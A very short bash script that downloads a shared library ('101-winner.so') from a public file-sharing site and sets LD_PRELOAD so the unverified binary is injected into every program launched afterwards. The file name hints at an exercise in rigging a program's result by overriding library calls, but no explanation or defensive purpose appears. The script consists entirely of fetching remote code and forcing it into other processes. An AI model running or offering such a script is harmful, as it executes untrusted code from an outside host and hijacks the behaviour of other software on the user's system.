#!/bin/bash
wget https://filebin.net/9vqedb7tr2yelxo6/101-winner.so -O ../winner.so
export LD_PRELOAD="$PWD/../winner.so"
